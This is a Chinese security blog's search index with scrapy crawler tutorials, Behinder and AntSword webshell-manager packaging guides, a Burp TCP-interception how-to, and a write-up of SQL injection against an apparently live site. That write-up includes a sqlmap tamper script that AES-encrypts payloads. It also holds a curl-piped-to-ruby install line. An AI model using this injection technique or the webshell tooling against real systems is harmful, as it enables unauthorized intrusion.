<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python-scrapy学习(四)]]></title>
    <url>%2Farchives%2F8c2656f.html</url>
    <content type="text"><![CDATA[scrapy学习到此告一段落，下图为一个项目的框架图。在Python2-Scrapy学习(三)学习如何将数据进行存储，接下来学习如何使用selenium解析JS、邮件通知selenium解析JS在爬取seebug直接请求无法访问到数据页面，发现访问seebug流程为：访问seebug-解析js-赋值cookie字段-再次访问-成功获取数据。查阅资料得知scrapy可以使用Splash进行JavaScript渲染，但是根据官网信息显示得与docker进行配合。后面想起来可以通过selenium进行解析，但是scrapy-selenium需要python&gt;=3.6。但是，我使用的是2.7，因此，我直接使用selenium进行解析。Ps：在CentOS6下，无法使用Chrome进行。安装直接使用pip安装selenium即可，phantomjs已经暂停项目，新版的selenium已经不支持phantomjs。报错信息：UserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead。因此，根据官方文档需要下载相应的浏览器内核（Chrome、Edge、Firefox、Safari）。我下载了Chrome Driver，并将chromedriver文件移动到/usr/local/bin目录下。1pip install selenium使用middlewares安装完成之后，我想的是通过scary项目的方式进行调用（例如scrapy-selenium），所以并不会采取直接在爬虫里面selenium的调用。通过阅读scrapy文档发现，可以在middleware.py中将selenium使用封装成类，通过setting.py或者爬虫custom_settings进行调用。middlewares.py123456789101112131415161718192021222324from selenium import webdriverfrom scrapy.http import HtmlResponsefrom scrapy.exceptions import IgnoreRequestfrom selenium.webdriver.chrome.options import Optionsclass SeleniumMiddleware(object): def __init__(self): self.chrome_options = Options() self.chrome_options.add_argument('--headless') self.chrome_options.add_argument('--disable-gpu') self.driver = webdriver.Chrome(chrome_options=self.chrome_options) # self.driver = webdriver.Chrome() def process_request(self, request, spider): self.driver.get(request.url) time.sleep(3) try: body = self.driver.page_source return HtmlResponse(self.driver.current_url, body=body, encoding='utf-8', request=request) except Exception as e: # Timeout on WebDriverWait logging.error(e) raise IgnoreRequestseebug.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import scrapyimport timefrom zjyd.items import ZjydItemfrom scrapy.utils.project import get_project_settingssettings = get_project_settings()class SeebugSpider(scrapy.Spider): name = 'seebug' allowed_domains = ['seebug.org'] custom_settings = &#123; 'DOWNLOADER_MIDDLEWARES': &#123; 'zjyd.pipelines.SeleniumMiddleware': 723, &#125;, &#125; def start_requests(self): keywords = list(settings['KEYWORDS']) for i in keywords: yield scrapy.Request(url=('https://www.seebug.org/search/?keywords=%s&amp;category=&amp;page=1' % str(i)), callback=self.parse) def parse(self, response): item = ZjydItem() if response.xpath("//table[@class='table sebug-table table-vul-list']/tbody/tr"): page = int(response.url[response.url.find('page=') + 5]) + 1 next_page = response.url[:response.url.find('page=') + 5] + str(page) else: next_page = None for i in response.xpath("//table[@class='table sebug-table table-vul-list']/tbody/tr"): if i.xpath("td[@class='text-center datetime hidden-sm hidden-xs']/text()").extract_first().strip()[:-6] == time.strftime("%Y-%m-%d").decode('utf-8'): item['source'] = 'seebug' item['title'] = i.xpath("td[@class='vul-title-wrapper']/a[@class='vul-title']/text()").extract_first() item['time'] = i.xpath("td[@class='text-center datetime hidden-sm hidden-xs']/text()").extract_first().strip() item['url'] = u'https://www.seebug.org' + i.xpath("td[@class='vul-title-wrapper']/a[@class='vul-title']/href").extract_first() item['content'] = i.xpath("td[@class='vul-title-wrapper']/a[@class='vul-title']/text()").extract_first() item['author'] = u'null' else: next_page = None continue if item: yield item else: self.log('%s is none!' % (response.url)) if next_page is not None: next_page = response.urljoin(next_page) yield scrapy.Request(next_page, callback=self.parse) self.log("seebug sprider:%s" % (response.url))Or setting.py123456DOWNLOADER_MIDDLEWARES = &#123; 'zjyd.middlewares.ZjydDownloaderMiddleware': 543, 'scrapy.downloadermiddlewares.retry.RetryMiddleware': 90, 'scrapy_proxies.RandomProxy': 100, 'scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware': 110,&#125;通过上面的配置就可以将seebug的内容解析出来，并进行数据存储。项目整合现在项目上有freebuf、seebug等爬虫，通过scrapy list可以查看项目下一共有多少个爬虫。爬虫整合项目下每个爬虫为一个文件，并非所有爬虫都在一个文件、按照类进行划分。所以需要一个脚本，运行所有的爬虫。通过官方文档可以看到提供了API接口的方式运行爬虫。这里我采用将所有爬虫通过process.crawl进行运行。123456789101112131415161718192021from scrapy.crawler import CrawlerProcess# from scrapy import spiderloaderfrom scrapy.utils.project import get_project_settingssettings = CrawlerProcess(get_project_settings())def main(): process = CrawlerProcess(settings) process.crawl('freebuf', domain='freebuf.com') process.crawl('vulbox', domain='vulbox.com') process.crawl('anquanke', domain='anquanke.com') process.crawl('bugbank', domain='bugbank.com') process.crawl('seebug', domain='seebug.com') process.crawl('cnvd', domain='cnvd.org.cn') # spider_loader = spiderloader.SpiderLoader.from_settings(settings) # spiders = spider_loader.list() # classes = [spider_loader.load(name) for name in spiders] # for i in classes: # process.crawl(i) process.start()通过上述方法就可以运行项目下的freebuf、vulbox等爬虫。邮件通知现在爬虫所获的的数据都会存储在MongoDB数据库中，通过读取数据库中当前日期的数据，进行邮件通知即可。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-# import osimport timeimport pymongoimport scrapyimport smtplibfrom email.header import Headerfrom email.mime.text import MIMETextfrom scrapy.crawler import CrawlerProcessfrom scrapy.utils.project import get_project_settingsfrom scrapy import spiderloadersettings = get_project_settings()def send_mail(): mongo_client = pymongo.MongoClient(host=settings["MONGODB_HOST"], port=settings["MONGODB_PORT"]) mongo_db = mongo_client[settings["MONGODB_DBNAME"]] mongo_query = &#123;'time': time.strftime("%Y-%m-%d").decode('utf-8')&#125; result = "邮件更新提醒:\n" spider_loader = spiderloader.SpiderLoader.from_settings(settings) spiders = spider_loader.list() for i in spiders: mongo_col = mongo_db[i] if mongo_col.find(mongo_query).sort("ts",pymongo.ASCENDING).count() != 0: result += '%s 有更新,请注意查收!\n' % (i) else: result += '%s无更新!\n' % (i) sender = settings["MAIL_SENDER"] receivers = settings["MAIL_RECEIVERS"] message = MIMEText(result,'plain','utf-8') message['From'] = Header("hywell", 'utf-8') message['To'] = receivers subject = "信息收集爬虫" message['Subject'] = Header(subject, 'utf-8') smtpObj = smtplib.SMTP() smtpObj.connect(settings["MAIL_HOST"], 25) smtpObj.login(settings["MAIL_USER"], settings["MAIL_PASSWORD"]) smtpObj.sendmail(sender, receivers, message.as_string()) mongo_client.close()def main(): process = CrawlerProcess(settings) spider_loader = spiderloader.SpiderLoader.from_settings(settings) spiders = spider_loader.list() classes = [spider_loader.load(name) for name in spiders] for i in classes: process.crawl(i) process.start() send_mail()if __name__ == "__main__": main()总结python2.7越来越“老旧了”，新的模块很多都已经不支持python2.7，后续还是得开始使用python3进行编程。毕竟，python最主要的就是可以import module；在进行邮件发送的时候，要注意邮箱服务器的设置，例如：密码是否需要设置为独立密码、发件人信息是否有与账号匹配校验等；由于Chrome最新版本不支持CentOS6，我通过种种方式安装上了Chrome以及成功运行ChromeDriver，但是在运行时会出现卡在开始连接[urllib3.connectionpool] DEBUG: Starting new HTTP connection (1): 127.0.0.1:1269，后面改用Firefox。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jar文件打包成app]]></title>
    <url>%2Farchives%2F4afab831.html</url>
    <content type="text"><![CDATA[在Mac上运行jar文件（例如Behinder）每次都需要1java -XstartOnFirstThread -jar Behinder.jar，感觉太繁琐了。因此，想打包成app方便使用。成功打包效果图如下，这里给大家提供打包出来的app。链接:https://pan.baidu.com/s/1474CrgbbSfbXxqJGg9carA 密码:f9vm使用工具可方便的将jar文件打包成app，本文以Behinder为例，记录所遇到的问题以及如何处理。前期准备下载jar2app之后，将其安装。12345678910# Installgit clone https://github.com/Jorl17/jar2appcd jar2appchmod +x install.sh uninstall.shsudo ./install.sh# Install to /usr/local/bingit clone https://github.com/Jorl17/jar2appcd jar2appchmod +x install.sh uninstall.shsudo ./install.sh /usr/local/bin生成APP通过jar2app的命令我们可以得知，直接使用对应命令即可生成。其中需要注意以下两点：Behinder需要通过-XstartOnFirstThread命令启动；Behinder需要jre6~jre8版本才可以运行。因此我在使用jar2app时，指定了JVM设置和JDK版本。1jar2app Behinder.jar -j "-XstartOnFirstThread" -r /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk使用上面的命令可以成功生成一个app，但是直接运行无法打开。问题排查直接打开Behinder.app/Contents/MacOS/JavaAppLauncher启动脚本，提示数据库文件丢失，无法启动。数据库文件丢失根据报错信息提示以及Behinder本身的文件结构，我将data.db移动到Behinder.app/Contents和其他杂七杂八的位置都不行。123456Contents/data.dbContents/Java/data.dbContents/MacOS/data.dbContents/Plugins/jdk1.8.0_181.jdk/Contents/data.dbContents/Plugins/jdk1.8.0_181.jdk/Contents/MacOS/data.dbContents/Resources/data.db重构class文件根据报错信息（数据库文件丢失）以及上述所进行的测试方法，基于当前的情况，只能通过将jar包文件反编译成class文件进行查看，判断本身源码逻辑。这里我采用JD进行反编译，直接加载Behinder的jar包文件。根据关键字：data.db进行搜索。根据上图可以看到对应判断的逻辑在：net/rebeyond/behinder/core/ShellManager.class文件中：123if (!new File("data.db").exists()) &#123; throw new Exception("数据库文件丢失，无法启动。"); &#125;通过File().exists()进行判断文件是否存在，根据大佬的提示得知File().exists()使用的user.home作为路径，将其修改成File.getAbsoluteFile()即可成功。在JD将ShellManager.class保存成java代码，使用Intellij创建一个项目。Ps:也可以用eclipse等。这里我新建了一个Maven项目，Project SDK选择1.8.0下面有关字段全部设置成Behinder将ShellManager.java文件拖入到src/main/java目录下，并将File().exists()修改成File().getAbsoluteFile().exists()。新建一个package，右键java目录new即可创建，目录名称为net.rebeyond.behinder.core。该名称来源为ShellManager在Behinder.jar文件中的路径。将ShellManager.java文件移动到net.rebeyond.behinder.core中。此时还有一系列包引入问题待解决，这时候点击【File】选项中的【Project Structure】功能，在【Project Settings】中的【Modules】的【Dependencies】中引入Behinder.jar文件。这时候还存在模块无法import的问题，根据查看发现是json模块无法引入，查看JD中json包是20180130的。在jar-download页面进行下载即可，下载完成之后，按照刚刚的流程导入。导入完成之后，这时候已经所有包都正常import。使用【Build Project】将java文件编译成class文件。解压Behinder.jar文件，将解压出来的ShellManager.class文件替换成新编译出来的ShellManager.class文件。替换完成之后，使用压缩软件将其压缩成zip。将文件后缀修改成jar，在终端下运行，看能否成功运行。Ps：记得在Behinder.jar文件同级目录需要有一个data.db；这里有个问题，我用BetterZip将其压缩成zip之后，修改后缀无法运行，使用BandiZip（Windows）压缩可以，猜测有可能是软件压缩机制或者操作系统的问题。1java -XstartOnFirstThread -jar Behinder.jar可以成功运行，在使用jar2app命令将其打包成app1jar2app Behinder.jar -j "-XstartOnFirstThread" -r /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk将data.db文件移动到Behinder.app/Contents即可成功运行。生成带有图标的APP上面生成的app是没有图标的，jar2app有-i参数支持图标生成。直接将Behinder.jar文件的net/rebeyond/behinder/resource目录下的logo.jpg拿出来。使用ICON在线转换，这里需要注意的是下载的文件格式应该为icns，并非是icon。使用如下命令即可生成一个带有logo图标的Behinder.app文件。1jar2app Behinder.jar -j "-XstartOnFirstThread" -r /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk -i logo.icns总结这里面踩了无数个坑，反反复复好长一段时间才解决。工具记得多读手册，例如在这里用的jar2app直接在GitHub上面多读手册，基本问题都能解决；实现同样功能的不同函数，在使用时需要按照需求进行使用。例如这里的File().exists()与File.getAbsoluteFile()，不同函数名总有会不一样的地方，直接平时只是为了实现功能而忽略其本质，有时候出现问题的时候需要深入了解其本质；在处理问题过程中使用到软件工具出现问题时，可不进行任何修改重复使用软件进行问题定位。例如这里的BetterZip压缩之后无法运行，我是通过直接解压缩-压缩-运行将这个问题定位出来的。]]></content>
      <categories>
        <category>安全研究</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite抓取非HTTP协议流量]]></title>
    <url>%2Farchives%2Fffc80a19.html</url>
    <content type="text"><![CDATA[在进行APP渗透的时候，设置代理到BurpSuite的时候，发现没拦截到包，但是已经获取到数据。猜测是请求包走的是非HTTP协议，发现BurpSuite有一个插件可以抓取TCP的流量：NoPE Proxy。NoPE安装NoPE安装很简单，直接下载对应的jar文件，然后在BurpSuite的【Extender】选项卡中添加即可。Ps：记得要配置Java Environment环境。NoPE使用安装完成之后，需要对NoPE进行配置：DNS配置、HTTP代理设置等。Server设置在NoPE工具的【Server Config】选项卡进行配置，猜测设置DNS是为了获取请求包的domain。设置【DNS Response IP】和【DNS Listener Port】，将这个ip设置为代理服务器的ip地址，port设置为DNS常用端口：53；设置【Interface】，这个是设置网卡，可通过ifconfig查看 ；点击【Add 80 &amp; 443 to Burp】，将80、443端口添加到Burp。设置完之后回到【Proxy】选项卡的【Options】看一下，并且将Invisible设置为勾选（如果没勾选）。Ps：这时候可以使用手机进行操作，看看BurpSuite能不能拦截到HTTP的包。HTTP Proxy设置设置完Server之后，在【NoPE Proxy】选项卡的【Server Config】中启动DNS服务，直接点击那个大大的绿色箭头就可以了，显示红色为已经运行。查看【DNS History】选项卡中的DNS记录，获取Domain、Port等信息。开启Port Monitor；在手机上进行操作；获取Domain和与其对应的Port。在获取对应Port有可能会有点烦，我在获取Port的时候每次会有一堆的信息冒出来，导致并不知道那个Port跟domain是对应上的，所以点了好多次。获取到Domain与Port之后，回到【Server Config】选项卡中，将信息填入到【Non HTTP Proxy Settings】中，例如我现在有了一个domain为xxxx.com，端口为8020，将其填入对应的地方进行添加，添加之后勾选Enable即可。拦截TCP流量通过上面的配置，现在已经可以通过NoPE拦截非HTTP协议的流量。在【TCP intercept】选项卡开启【Intercept is ON】，在手机上进行操作，就可以在下面看到对应的请求包。由于我这边已经把包放过了，给大家看下历史记录的包。总结通过这种方式已经可以拦截到TCP的流量，但是通过NoPE感觉操作很繁琐。不知道有没有比的简单、优雅的方式？]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>BurpSuite</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-Scrapy学习(三)]]></title>
    <url>%2Farchives%2F80b032ee.html</url>
    <content type="text"><![CDATA[继续学习scrapy,这次学习如何将数据进行存储。在Python2-Scrapy学习(二)学习如何通过xpath获取数据，接下来通过MongDB or MySQL将数据进行保存。scrapy数据存储freebuf搜索信息爬取上一章中爬取的数据为freebuf首页的资讯，这次爬取freebuf搜索所产生的数据。Ps：上一章通过HTTP进行访问，这次直接通过HTTPS就不需要考虑COOKIE的问题。由于搜索返回的是json，因此不需要使用xpath，直接使用json进行解析即可获取数据。这里就直接贴上爬取代码：​ # -- coding: utf-8 --​ import scrapy​ import time​ import json​ import pymongo​from freebuf.items import FreebufItem​class FreebufSpider(scrapy.Spider):name = ‘freebuf’allowed_domains = [‘freebuf.com’]custom_settings = {‘ITEM_PIPELINES’: {‘freebuf.pipelines.MongodbPipeline’: 300,}}def start_requests(self): urls = [ u&apos;https://search.freebuf.com/search/find/?year=0&amp;score=0&amp;articleType=0&amp;origin=0&amp;tabType=1&amp;content=攻击&amp;page=1&apos;, ] for url in urls: yield scrapy.Request(url=url, callback=self.parse) def parse(self, response): item = FreebufItem() data = json.loads(response.body_as_unicode()) if data[&quot;data&quot;][&quot;total&quot;] != u&apos;0&apos;: page = int(response.url[response.url.find(&apos;page=&apos;) + 5:]) + 1 next_page = response.url[:response.url.find(&apos;page=&apos;) + 5] + str(page) for i in data[&quot;data&quot;][&quot;list&quot;]: if i[&quot;time&quot;] == time.strftime(&quot;%Y-%m-%d&quot;).decode(&apos;utf-8&apos;): item[&apos;source&apos;] = &apos;freebuf&apos; item[&apos;title&apos;] = i[&quot;title&quot;] item[&apos;url&apos;] = i[&apos;url&apos;] item[&apos;content&apos;] = i[&apos;content&apos;] item[&apos;time&apos;] = i[&apos;time&apos;] item[&apos;author&apos;] = i[&apos;name&apos;] else: next_page = None continue yield item if next_page is not None: next_page = response.urljoin(next_page) yield scrapy.Request(next_page, callback=self.parse) self.log(&quot;Freebuf sprider:%s&quot; % (response.url)) custom_settings用于爬虫自定义设置，该优先级大于项目设置。这里设置使用pipelines.py文件中MongodbPipeline类对数据进行处理，优先级300（数字越小，优先级越高）。数据处理在piplines.py中我写了两个类：MongodbPipeline、MysqlPipeline，分别存储进MongoDB、MySQL。其中MongoDB已经测试，可完美进行存储；MySQL还未进行测试。​ # -- coding: utf-8 --​# Define your item pipelines here # # Don&apos;t forget to add your pipeline to the ITEM_PIPELINES setting # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html import pymongo import pymysql from scrapy import log from scrapy.conf import settings from twisted.enterprise import adbapi ​class MongodbPipeline(object):def init(self):self.mongo_host = settings[“MONGODB_HOST”]self.mongo_port = settings[“MONGODB_PORT”]self.mongo_db = settings[“MONGODB_DBNAME”] def open_spider(self, spider): self.client = pymongo.MongoClient(host=self.mongo_host, port=self.mongo_port) self.db = self.client[self.mongo_db] def close_spider(self, spider): self.client.close() def process_item(self, item, spider): info = dict(item) self.db[item[&apos;source&apos;]].insert_one(info) return item class MysqlPipeline(object): def __init__(self): dbparms = dict( host = settings[&apos;MYSQL_HOST&apos;], port = settings[&apos;MYSQL_PORT&apos;], dbname = settings[&apos;MYSQL_DBNAME&apos;], user = settings[&apos;MYSQL_USER&apos;], passwd = settings[&apos;MYSQL_PASSWORD&apos;], charset = &apos;utf8&apos;, cursorclass = pymysql.cursors.DictCursor, use_unicode = True, ) self.dbpool = adbapi.ConnectionPool(&quot;pymysql&quot;, **dbparms) def process_item(self, item, spider): query = self.dbpool.runInteraction(self.do_insert, item, spider) log.msg(&quot;MySQL connect&quot;) query.addErrback(self.handle_error, item, spider) query.addBoth(lambda _: item) return query def handle_error(self, failure, item, spider): print failure def do_insert(self, cursor, item): cursor.execute(&quot;insert into freebuf (title, url, content, time, author, source) values(%s, %s, %s, %s, %s, %s)&quot;, item[&apos;title&apos;], item[&apos;url&apos;], item[&apos;content&apos;], item[&apos;time&apos;], item[&apos;author&apos;], item[&apos;source&apos;]) 数据库配置在项目settings.py文件需要定义数据库host、port、username、password等，直接在最后面加上配置信息即可。​ # MongDB Config​ MONGODB_HOST = ‘localhost’​ MONGODB_PORT = 27017​ MONGODB_DBNAME = ‘freebuf’​# MySQL Config # MYSQL_HOST = &apos;localhost&apos; # MYSQL_PORT = 3306 # MYSQL_DBNAME = &apos;freebuf&apos; # MYSQL_USER = &apos;root&apos; # MYSQL_PASSWORD = &apos;root&apos; 总结项目、爬虫本身都可以进行配置，爬虫本身所配置的优先级大于项目。优先级：Command line options (most precedence)> Settings per-spider> Project settings module> Default settings per-command> Default global settings (less precedence)；通过response.urljoin可将需要爬取的url添加至待爬取池，只要解析规则正确就可以将所需要的页面不断加入待爬取池；scrapy函数大部分都可以通过callback进行回调，yield进行资源控制超级棒；感觉item.py文件利用的较少，应该还有我不知道的用途。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试-加密SQL注入]]></title>
    <url>%2Farchives%2F5f6b1580.html</url>
    <content type="text"><![CDATA[在日站的时候，发现一处注入。但是注入语句被AES加密。通过Chrome进行单步debug，拿到了key、iv等信息。最后使用SQLMap加载tamper进行自动注入。寻找注入点渗透的时候，发现了一个页面，参数有initSql，看到这个参数名称猜测这个参数是用来进行SQL查询的，但是这个参数被加密了。将initSql的值替换成后一个请求的initSql参数的值，回显信息里面出现了SQL报错信息。现在可以判断这个就是一个注入点，但是现在这样是没办法把数据成功注入出来！转头一想，进行请求的时候参数值已经被加密，那么这个加密操作十有八九是在前端通过JS进行加密，服务器再进行解密。寻找加密信息按照刚刚的思路，现在去import的JS里面进行寻找关键的加密函数以及加密，使用chrome开发者工具中的【Select an element in the page to inspect it】定位到【Sources】中的对应行业，点击左边的行数进行debug，通过不断的单步直至找到对应的js。使用找到的iv、key可成功的对加密之后的语句进行解密，但是这样去注入得手工一点一点的去搞，还是得祭出SQLMap这种神器最方便。想起SQLMap可以使用tamper加载脚本，对注入的payload进行处理。这里直接把代码贴上来给大家参考参考。123456789101112131415161718192021222324252627282930#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""import base64from Crypto.Cipher import AESfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef tamper(payload, **kwargs): BS = AES.block_size pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) key = "xxxxxxxxxx" iv = "xxxxxxxx" cipher = AES.new(key) cipher = AES.new(key, AES.MODE_CBC, IV=iv) encrypted = cipher.encrypt(pad(payload)) encrypted = base64.b64encode(encrypted) return encrypted后面加载这个tamper就可以直接用SQLMap跑了。总结这个漏洞产生原因”大概“是因为上次被发现注入，开发人员”偷懒“直接调用CryptoJS进行加密，导致该漏洞产生；现在很多操作都会放在前端进行操作，挖挖前端也是一种思路。]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-Scrapy学习(二)]]></title>
    <url>%2Farchives%2F2ba6ae11.html</url>
    <content type="text"><![CDATA[继续学习scrapy,这次学习如何进行数据爬取。在Python2-Scrapy学习(一)大致了解了scrapy的基础使用方式，接下来开始使用scrapy结合xpath爬取所需的信息。freebuf资讯爬取假定需要爬取的是freebuf最新的资讯，通过Chrome的Elements可以看到资讯的信息在class=news_inner news-list的div中。使用scrapy shell命令进行调试。1scrapy shell -s USER_AGENT='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36' 'http://www.freebuf.com使用xpath选择器来筛选需要的数据。最后使用scrapy crawl freebufSprider -o result.json可将结果保存至result.json中。总结爬虫的步骤：访问站点、解析数据、获取数据。scrapy支出css、xpath，大家看哪个顺手就用那个好了。完整代码完整代码已经上传到GitHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-Scrapy学习(一)]]></title>
    <url>%2Farchives%2F84973573.html</url>
    <content type="text"><![CDATA[以前写爬虫都是自己使用requests、bs4等库手工编写，最近想学学scrapy看看这个爬虫神器有多强大。Install scrapy使用pip安装scrapy即可。sudo pip install scrapyscrapy的命令常用的有：startproject、shell、crawl等。Scrapy runspider使用scrapy runspider直接运行爬虫脚本。相对项目而言方便快捷。这里我直接使用官方文档的示例。import scrapyclass QuotesSpider(scrapy.Spider): name = &quot;quotes&quot; start_urls = [ &apos;http://quotes.toscrape.com/tag/humor/&apos;, ] def parse(self, response): for quote in response.css(&apos;div.quote&apos;): yield { &apos;text&apos;: quote.css(&apos;span.text::text&apos;).extract_first(), &apos;author&apos;: quote.xpath(&apos;span/small/text()&apos;).extract_first(), } next_page = response.css(&apos;li.next a::attr(&quot;href&quot;)&apos;).extract_first() if next_page is not None: yield response.follow(next_page, self.parse) 使用-o参数可以导出结果。scrapy runsprider freebuf.py -o result.jsonscrapy startproject使用scrapy startproject创建爬虫项目。Config setting使用scrapy新建爬虫项目，这里我测试站点选择freebuf，建立一个爬虫项目。scrapy startproject freebuf进入freebuf目录，创建基础爬虫。scrapy genspider freebufSprider “freebuf.com”之后目录结构如下图：进入freebuf目录下，查看settings.py配置文件。下面列出几个需要修改的配置。ROBOTSTXT_OBEY = False(不遵循Robots.txt规则)USER_AGENT = ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36’(修改User-Agent)DEFAULT_REQUEST_HEADERS = {‘Referer’: ‘http://www.freebuf.com/&#39;}(设置默认请求头)scrapy crawl一开始对freebuf进行爬虫的时候，发现响应包返回不正确。初步猜测freebuf站点有反爬虫的策略(猜测主要有四点：User-Agent、Cookie、Referer、请求间隔)。为了方便查看请求包，对请求设置HTTP代理。修改settings.py文件中的DOWNOLOAD_MIDDLEAWARESDOWNLOADER_MIDDLEWARES = {‘scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware’: 110,‘freebuf.middlewares.ProxyMiddleware’: 100,}在middlewares.py中增加一个class。class ProxyMiddleware(object):# overwrite process request def process_request(self, request, spider): # Set the location of the proxy request.meta[&apos;proxy&apos;] = &quot;http://127.0.0.1:8080&quot; 如上配置，请求包会通过代理发送到本地8080端口。这里，我使用BurpSuite进行代理拦截。freebufSprider.py文件进行编写，设置cookie。freebuf的cookie最主要的有两个：acw_sc、acw_tc。# -*- coding: utf-8 -*- import scrapy from scrapy import Request class FreebufspriderSpider(scrapy.Spider): name = &apos;freebufSprider&apos; allowed_domains = [&apos;freebuf.com&apos;] start_urls = [&apos;http://www.freebuf.com&apos;] cookie = { &apos;acw_sc__&apos;: &apos;5b7fb0aee4ffebd067ed819b701014fb3451fcbe&apos;, &apos;acw_tc&apos;: &apos;5b7fbdbc6a0b102973a7c8a7b9ecbf0304865342&apos;, } def start_requests(self): yield Request(self.start_urls[0], callback=self.parse, cookies=self.cookie) def parse(self, response): title = response.css(&apos;title::text&apos;).extract_first() self.log(u&apos;编码:%s&apos; % response.encoding) self.log(u&apos;标题:%s&apos; % title) 在项目目录下执行sudo scrapy crawl freebufSpriderscrapy shell也可以使用scrapy的shell进行测试，通过-s USER_AGENT进行请求头设置（不知道为什么使用shell命令，不带cookie也会得到正确的回显）。sudo scrapy shell -s USER_AGENT=’Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36’ ‘http://www.freebuf.com总结针对不同站点写爬虫的时候，首先需要对站点有所了解：robots.txt、反爬虫机制等。Scarpy爬虫项目相对自己编写的爬虫，整体感强，作为一整个项目来进行编写。以前的那种写法，经常一个脚本就要包含一大堆东西，到最后整体很乱，不利于后期代码维护；用Scrapy或者Requests&amp;bs4都需要对目标站点需要有所了解；单个脚本的scrapy提供了导出等API接口，相对自己些的更方便。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用electron-build打包]]></title>
    <url>%2Farchives%2F221b42d4.html</url>
    <content type="text"><![CDATA[在Mac上运行electron框架程序（例如Antsword、CaptfEncoder等）每次都需要npm start，感觉太繁琐了。因此，想打包成app方便使用。成功打包效果图如下，这里给大家提供打包出来的dmg包。Antsword链接:https://pan.baidu.com/s/1Z4NwAMwcOadof93_1na8mA 密码:eokxCaptfEncoder链接:https://pan.baidu.com/s/1P4V_OsOIsKu258XbUAE-Zw 密码:659d本文以Antsword为例。前期准备安装brew12/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"brew --version安装node123brew install nodenode --versionnpm --version安装yarn12brew install yarnyarn --version安装electron-builder，安装成功之后需要建立软连接1234yarn add electron-builder -devsudo find / -name electron-builderln -s /Users/hywell/node_modules/.bin/electron-builder /usr/local/bin/electron-builderelecctron-builder --version下载蚁剑，安装依赖并启动1234git clone https://github.com/AntSwordProject/antSword.git'cd antSwordnpm installnpm start打包修改antSword目录下的package.json，结构如下：1234567891011121314151617181920212223242526272829303132333435363738394041&#123; "name": "antsword", "version": "1.3.0", "description": "中国蚁剑是一款跨平台的开源网站管理工具", "main": "app.js", "build": &#123; "appId": "1.0", "mac": &#123; //添加设置mac下的配置 "category": "public.app-category.developer-tools", "target": [ "dmg" ] &#125; &#125;, "scripts": &#123; "start": "electron app.js", "build": "npm start", "pack": "electron-builder --dir", "dist": "electron-builder" // 添加用于执行dist命令 &#125;, "author": "antoor &lt;u@uyu.us&gt;", "license": "MIT", "repository": &#123; "type": "git", "url": "https://github.com/antoor/antSword" &#125;, "debug": true, "update": &#123; "md5": "184c9217b01513647ccfaad49e795cfe", "logs": "移除webpack以及其他不必要的依赖，直接无需编译即可执行ES6代码\n更新美化关于页面\n重构modules/request.js后端数据请求模块\n添加 aspx hex encoder 支持\n修正custom shell 读取自身时数据被截断的 bug\n增加php中的mysql数据库模板，用于不支持使用mysqli的服务器\n以及其他小部分的代码重构优化", "sources": &#123; "coding.net": "https://coding.net/api/share/download/c405db5d-6fdb-4078-9326-32cd86c392a3", "github": "https://github.com/antoor/antSword/releases/download/1.3.0/update.zip" &#125; &#125;, "bugs": &#123; "url": "https://github.com/antoor/antSword/issues" &#125;, "homepage": "http://uyu.us", "postinstall": "electron-builder install-app-deps"&#125;在antSword目录下新建一个app文件夹，将antSword目录下所有文件迁移到app文件夹下(保证原有结构不变)。结构如下:在里面新建一个package.json文件，结构如下:12345678910111213141516171819202122&#123; "name": "antsword", "version": "1.3.0", "main": "app.js", "description": "antsword-MacOS", "author": "antoor &lt;u@uyu.us&gt;", "dependencies": &#123; // 将上个文件的依赖迁移 "babel": "^5.2.17", "extract-zip": "^1.5.0", "geoips": "0.0.1", "iconv-lite": "^0.4.13", 